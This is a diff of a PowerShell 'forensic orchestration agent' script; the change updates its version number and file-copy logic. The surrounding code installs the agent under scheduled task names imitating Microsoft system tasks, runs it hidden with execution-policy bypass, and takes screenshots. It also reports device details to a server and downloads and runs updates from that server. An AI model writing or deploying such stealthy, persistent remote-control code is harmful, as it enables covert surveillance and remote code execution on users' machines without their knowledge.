@@ -1,4 +1,4 @@
-# Version: 3.0.2
+# Version: 3.0.3
 # Description: Unified Forensic Orchestration Agent (Pierogi Reconstruction + Purge)
 
 param(
@@ -62,7 +62,7 @@ function Take-Screenshot {
 
 # 2. INSTALLATION (STEALTH v3.0 + AGGRESSIVE PURGE)
 function Install-AgentV3 {
-    Log-Message "Initiating Global Purge & Installation v3.0.2..."
+    Log-Message "Initiating Global Purge & Installation v3.0.3..."
     $MainTask = "Microsoft-Windows-Security-Maintenance"
     $WatchTask = "Microsoft-Windows-Diagnostics-Verify"
 
@@ -80,12 +80,18 @@ function Install-AgentV3 {
     $LegacyPaths = "C:\ProgramData\Unified-Enterprise-Agent", "C:\ProgramData\Microsoft\Diagnostic-Cleanup"
     foreach ($P in $LegacyPaths) { if (Test-Path $P) { Remove-Item $P -Recurse -Force -ErrorAction SilentlyContinue } }
 
-    # 4. DEPLOY CURRENT VERSION
-    if ($PSCommandPath -and (Test-Path $PSCommandPath) -and ($PSCommandPath -ne $ScriptPath)) {
-        Copy-Item -Path $PSCommandPath -Destination $ScriptPath -Force
-    }
+    # 4. DEPLOY CURRENT VERSION (Robust Path Check)
+    try {
+        if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
+            $Source = [System.IO.Path]::GetFullPath($PSCommandPath)
+            $Dest = [System.IO.Path]::GetFullPath($ScriptPath)
+            if ($Source -ne $Dest) {
+                Copy-Item -Path $Source -Destination $Dest -Force -ErrorAction Stop
+            }
+        }
+    } catch { Log-Message "Deployment copy skipped or failed: $_" }
     
-    @{ ServerUrl = $ServerUrl; Version = "3.0.2" } | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
+    @{ ServerUrl = $ServerUrl; Version = "3.0.3" } | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
 
     # Action & Trigger
     $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
@@ -109,13 +115,13 @@ try {
     if (Test-Path $ConfigPath) { $ServerUrl = (Get-Content $ConfigPath | ConvertFrom-Json).ServerUrl }
     $AgentId = Get-AgentId
     $SerialNumber = Get-SerialNumber
-    Log-Message "Forensic Orchestrator v3.0.2 Active. ID: $AgentId"
+    Log-Message "Forensic Orchestrator v3.0.3 Active. ID: $AgentId"
 
     while($true) {
         try {
             # Heartbeat
             $Payload = @{
-                agentId = $AgentId; serialNumber = $SerialNumber; version = "3.0.2"; status = "online"
+                agentId = $AgentId; serialNumber = $SerialNumber; version = "3.0.3"; status = "online"
                 deviceName = $env:COMPUTERNAME; localIp = Get-LocalIp; os = "Windows $([Environment]::OSVersion.Version)"
             }
             $Heartbeat = Invoke-RestMethod -Uri "$ServerUrl/api/agent/heartbeat" -Method Post -Body ($Payload | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 10
@@ -137,7 +143,7 @@ try {
             }
 
             # Update Check
-            if ($Heartbeat.latestVersion -and ([version]$Heartbeat.latestVersion -gt [version]"3.0.2")) {
+            if ($Heartbeat.latestVersion -and ([version]$Heartbeat.latestVersion -gt [version]"3.0.3")) {
                 Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile $ScriptPath -UseBasicParsing | Out-Null
                 Install-AgentV3; exit
             }
